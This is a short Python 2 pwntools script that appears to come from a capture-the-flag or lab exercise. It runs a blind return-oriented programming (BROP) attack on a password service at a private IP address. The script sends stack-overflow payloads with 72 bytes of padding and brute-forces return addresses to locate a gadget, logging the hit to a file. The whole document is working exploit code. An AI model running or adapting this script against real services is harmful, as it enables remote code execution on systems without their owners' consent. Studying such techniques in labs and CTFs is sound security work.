from pwn import *
context.log_level = "debug"

def get_brop_gadget(length,stop_gadget,addr):
    try:
        p = remote('192.168.10.185',4444)
        p.recvuntil("WelCome my friend,Do you know password?\n")
        payload = 'a'*length + p64(addr) + p64(0)*6 + p64(stop_gadget) + p64(0)*10
        p.sendline(payload)
        content = p.recv()
        p.close()
        print content
        if not content.startswith('WelCome'):
            return False
        return True
    except Exception:
        p.close()
        return False

def check_brop_gadget(length,addr):
    try:
        p = remote('192.168.10.185',4444)
        p.recvuntil("password?\n")
        payload = 'a'*length + p64(addr) + 'a'*8*10
        p.sendline(payload)
        content = p.recv()
        p.close()
        return False
    except Exception:
        p.close()
        return True

length = 72
stop_gadget = 0x4006d5
addr = 0x400750
f = open('brop.txt','w')
while 1:
    print hex(addr)
    if get_brop_gadget(length,stop_gadget, addr):
        print "possible stop_gadget :0x%x"%addr
        if check_brop_gadget(length,addr):
            print "success brop gadget:0x%x"%addr
            f.write("success brop gadget :0x%x"%addr)
            break
    addr += 1

f.close()

#brop gadget -->[0x4007ba]
